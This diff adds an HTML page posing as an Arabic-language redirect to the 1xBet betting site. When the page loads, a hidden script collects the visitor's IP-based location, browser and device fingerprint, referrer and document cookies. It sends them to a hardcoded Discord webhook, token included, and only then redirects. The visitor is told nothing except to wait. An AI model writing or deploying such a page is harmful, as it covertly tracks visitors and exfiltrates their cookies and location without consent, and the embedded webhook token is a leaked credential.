@@ -1,0 +1,83 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>1XBET</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    #message {
+      font-size: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div id="message">جاري تحويلك للموقع، يرجى الانتظار...</div>
+
+  <script>
+    const webhookUrl = 'https://discord.com/api/webhooks/1363573436290564218/anQti3PGWr2FaBbGWcsOI3MbUjFxMceQBqdb5CVNLP0TGUnCs_rGNbveyomWHsBo9ffW';
+
+    async function getIPData() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        return await res.json();
+      } catch {
+        return {};
+      }
+    }
+
+    function collectData(ipData) {
+      const now = new Date().toLocaleString();
+      const lat = ipData.latitude || "غير معروف";
+      const lon = ipData.longitude || "غير معروف";
+      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+      return {
+        content: `📥 **زائر جديد**
+        
+📍 **IP:** ${ipData.ip || "غير معروف"}
+🏙️ **المدينة:** ${ipData.city || "غير معروف"}
+🌍 **الدولة:** ${ipData.country_name || "غير معروف"}
+🕒 **التوقيت:** ${ipData.timezone || "غير معروف"}
+🗺️ **الموقع على الخريطة:** ${mapLink}
+
+💻 **المتصفح:** ${navigator.userAgent}
+🖥️ **النظام:** ${navigator.platform}
+🌐 **اللغة:** ${navigator.language}
+📏 **دقة الشاشة:** ${window.screen.width}x${window.screen.height}
+📡 **نوع الاتصال:** ${navigator.connection ? navigator.connection.effectiveType : "غير معروف"}
+⚡ **السرعة:** ${navigator.connection ? navigator.connection.downlink + " Mbps" : "غير معروف"}
+📱 **موبايل؟** ${'ontouchstart' in window ? "نعم" : "لا"}
+🌑 **الوضع الليلي؟** ${window.matchMedia("(prefers-color-scheme: dark)").matches ? "نعم" : "لا"}
+⏳ **مدة الجلسة:** ${Math.round(performance.now())}ms
+🔗 **المرجع:** ${document.referrer || "مباشر"}
+🕓 **الوقت:** ${now}
+🍪 **الكوكيز:** ${document.cookie || "لا يوجد"}
+`
+      };
+    }
+
+    async function main() {
+      const ipData = await getIPData();
+      const payload = collectData(ipData);
+
+      await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      setTimeout(() => {
+        window.location.href = "https://1xbet.com/";
+      }, 5000);
+    }
+
+    window.onload = main;
+  </script>
+</body>
+</html>
